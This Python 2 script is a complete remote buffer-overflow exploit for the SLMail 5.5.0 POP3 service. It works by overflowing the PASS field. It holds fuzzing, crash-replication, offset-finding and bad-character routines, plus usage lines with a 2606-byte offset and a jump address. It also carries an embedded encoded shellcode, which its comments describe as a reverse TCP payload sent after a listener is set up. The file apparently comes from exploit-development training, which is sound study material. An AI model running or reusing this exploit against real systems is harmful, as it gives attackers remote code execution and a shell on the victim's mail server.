# This is a python fuzzing script to fuzz the SLMail_5.5.0 client for buffer overflow opportunities
# Use this together with immunity debugger or any debugger of your liking on the target machine

#!/usr/bin/python
import sys
import socket
import traceback

# Print info about this script in case of bad usage
def printInfo():
    print "-------------------------------------------------------------------------"
    print "Usage  : python " + sys.argv[0] + " <targetIP> (<port>)"
    print "Example: python " + sys.argv[0] + " 10.13.21.44 110\n"

    print "For crash replication"
    print "Usage  : python " + sys.argv[0] + " <targetIP> <port> <buffersize>"
    print "Example: python " + sys.argv[0] + " <targetIP> <port> <bufferSize>"

    print "\nTo use a custom buffer"
    print "Usage  : python " + sys.argv[0] + " pattern <targetIP> <port> <pattern>"
    print "Example: python " + sys.argv[0] + " pattern 10.13.21.44 110 AAAAAAAAAAAAAAAAAAAAAAAAAAABBBB"
    print "Example: python " + sys.argv[0] + " pattern 10.13.21.44 110 `python -c 'print \"A\"*2606 + \"\\x8f\\x35\\x4a\\x5f\" + \"C\"*(3500-2610)'`"

    print "\nTo use the below functions, you'll need to edit this exploit file with custom bad characters/shellcode"
    print "\nTo find bad characters"
    print "Usage  : python " + sys.argv[0] + " badchars <targetIP> <port> <pattern>"
    print "Example: python " + sys.argv[0] + " badchars 10.13.21.44 110 AAAAAAAAAAAAAAAAAAAAAAAAAAABBBB"

    print "\nTo send the actual shellcode"
    print "Usage  : python " + sys.argv[0] + " shellcode <targetIP> <port> <pattern>"
    print "Example: python " + sys.argv[0] + " shellcode 10.13.21.44 110 AAAAAAAAAAAAAAAAAAAAAAAAAAABBBB"
    print "Example: python " + sys.argv[0] + " shellcode 10.13.21.44 110 `python -c 'print \"A\"*2606 + \"\\x8f\\x35\\x4a\\x5f\"'` `python -c 'print \"C\"*(3500-10-341)'`"
    print "-------------------------------------------------------------------------"
###

# Full badchars list
#badchars = (
#    "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
#    "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
#    "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
#    "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
#    "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
#    "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
#    "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
#    "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
#)


# Edit this list to filter out bad chars
badchars = (
    "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
    "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
    "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
    "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
    "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
    "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
    "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
    "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)


# Edit this shellcode, which is your evil payload (currently a reverse tcp connection)
# This exploit won't work unless you replace it with your own payload (use msfvenom unstaged payload)
shellcode =  ""
shellcode += "\xda\xd1\xbd\x9d\xa0\xb2\x95\xd9\x74\x24\xf4\x58"
shellcode += "\x29\xc9\xb1\x52\x31\x68\x17\x83\xe8\xfc\x03\xf5"
shellcode += "\xb3\x50\x60\xf9\x5c\x16\x8b\x01\x9d\x77\x05\xe4"
shellcode += "\xac\xb7\x71\x6d\x9e\x07\xf1\x23\x13\xe3\x57\xd7"
shellcode += "\xa0\x81\x7f\xd8\x01\x2f\xa6\xd7\x92\x1c\x9a\x76"
shellcode += "\x11\x5f\xcf\x58\x28\x90\x02\x99\x6d\xcd\xef\xcb"
shellcode += "\x26\x99\x42\xfb\x43\xd7\x5e\x70\x1f\xf9\xe6\x65"
shellcode += "\xe8\xf8\xc7\x38\x62\xa3\xc7\xbb\xa7\xdf\x41\xa3"
shellcode += "\xa4\xda\x18\x58\x1e\x90\x9a\x88\x6e\x59\x30\xf5"
shellcode += "\x5e\xa8\x48\x32\x58\x53\x3f\x4a\x9a\xee\x38\x89"
shellcode += "\xe0\x34\xcc\x09\x42\xbe\x76\xf5\x72\x13\xe0\x7e"
shellcode += "\x78\xd8\x66\xd8\x9d\xdf\xab\x53\x99\x54\x4a\xb3"
shellcode += "\x2b\x2e\x69\x17\x77\xf4\x10\x0e\xdd\x5b\x2c\x50"
shellcode += "\xbe\x04\x88\x1b\x53\x50\xa1\x46\x3c\x95\x88\x78"
shellcode += "\xbc\xb1\x9b\x0b\x8e\x1e\x30\x83\xa2\xd7\x9e\x54"
shellcode += "\xc4\xcd\x67\xca\x3b\xee\x97\xc3\xff\xba\xc7\x7b"
shellcode += "\x29\xc3\x83\x7b\xd6\x16\x03\x2b\x78\xc9\xe4\x9b"
shellcode += "\x38\xb9\x8c\xf1\xb6\xe6\xad\xfa\x1c\x8f\x44\x01"
shellcode += "\xf7\x70\x30\x09\x7b\x19\x43\x09\x92\x85\xca\xef"
shellcode += "\xfe\x25\x9b\xb8\x96\xdc\x86\x32\x06\x20\x1d\x3f"
shellcode += "\x08\xaa\x92\xc0\xc7\x5b\xde\xd2\xb0\xab\x95\x88"
shellcode += "\x17\xb3\x03\xa4\xf4\x26\xc8\x34\x72\x5b\x47\x63"
shellcode += "\xd3\xad\x9e\xe1\xc9\x94\x08\x17\x10\x40\x72\x93"
shellcode += "\xcf\xb1\x7d\x1a\x9d\x8e\x59\x0c\x5b\x0e\xe6\x78"
shellcode += "\x33\x59\xb0\xd6\xf5\x33\x72\x80\xaf\xe8\xdc\x44"
shellcode += "\x29\xc3\xde\x12\x36\x0e\xa9\xfa\x87\xe7\xec\x05"
shellcode += "\x27\x60\xf9\x7e\x55\x10\x06\x55\xdd\x30\xe5\x7f"
shellcode += "\x28\xd9\xb0\xea\x91\x84\x42\xc1\xd6\xb0\xc0\xe3"
shellcode += "\xa6\x46\xd8\x86\xa3\x03\x5e\x7b\xde\x1c\x0b\x7b"
shellcode += "\x4d\x1c\x1e"


global targetIP
global port
global pattern
global padding
global bufferSize

if len(sys.argv) < 3 or sys.argv[1] == "-h":
    printInfo()
    sys.exit(0)
###

targetIP = sys.argv[1]
port = sys.argv[2]

# Script must know how what args are given beforehand
if sys.argv[1] == "pattern" or sys.argv[1] == "badchars":
    targetIP = sys.argv[2]
    port = sys.argv[3]
    pattern = sys.argv[4]

elif sys.argv[1] == "shellcode":
    targetIP = sys.argv[2]
    port = sys.argv[3]
    pattern = sys.argv[4]
    padding = sys.argv[5]

elif len(sys.argv) == 4:
    bufferSize = sys.argv[3]
###


# The function to actually fuzz the SLMail service until it crashes
# Use this to find out the rough location of the crash
def fuzz():
    buff = ["A"]
    counter = 100

    while len(buff) <= 30:
        buff.append("A" * counter)
        counter = counter + 200
    ###
    
    for string in buff:
        print "Fuzzing PASS with %s bytes" %len(string)
        try:
            login(string)
        except:
            print "Target server crashed"
            sys.exit(0)
        ###
    ###
###


# The function to send a buffer of a set size to the service
# Use this function to replicate the crash 
def replicateCrash(bufferSize):
    buff = "A" * int(bufferSize)

    try:
        print "\nSending evil buffer with %s bytes" %bufferSize
        login(buff)
        print "Done!"
    except:
        print "Could not connect to target server!"
###


# The function to be used with a custom buffer (pattern_create)
# Use this function to locate the exact crash location
def findCrash(buff):
    try:
        print "\nSending evil buffer:\n%s" %buff
        login(str(buff))
        print "Done!"
    except:
        #traceback.print_exc()
        print "Could not connect to target server!"
###


# The function to detect bad characters
# Edit the uncommented 'badchars' list 
# and redo the exploit to see the result
def findBadChars(buff):
    try:
        print "\nSending evil buffer:\n%s" %buff
        payload = buff + badchars

        login(payload)
    except:
        #traceback.print_exc()
        print "Could not connect to target server!"
###


# The function to send shellcode to the target
# Use this function to actually do the remote BOF
# Set up a handler/ncat listener before executing this
# Order of payload: buffer, jmp esp, nopsled, padding
def sendShellcode(buff, padding):
    try:
        print "\nSending shellcode:\n%s" %buff
        payload = buff + shellcode + padding

        login(payload)
    except:
        traceback.print_exc()
        print "Could not connect to target"
###


# The function to actually connect and try to login to the server
def login(payload):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect((targetIP, int(port)))
    s.recv(1024)
    s.send("USER test\r\n")
    s.recv(1024)
    s.send("PASS " + str(payload) + "\r\n")
    s.send("QUIT\r\n")
    s.close()
###


# The main function
def main():
    # Check parameters
    if sys.argv[1] == "pattern":
        findCrash(pattern)
        sys.exit(0)

    elif sys.argv[1] == "badchars":
        findBadChars(pattern)
        sys.exit(0)

    elif sys.argv[1] == "shellcode":
        sendShellcode(pattern, padding)
        sys.exit(0)

    elif len(sys.argv) == 3:
        fuzz()
        sys.exit(0)

    elif len(sys.argv) == 4:
        replicateCrash(bufferSize)
        sys.exit(0)

    else:
        printInfo()
        sys.exit(0)
###

main()
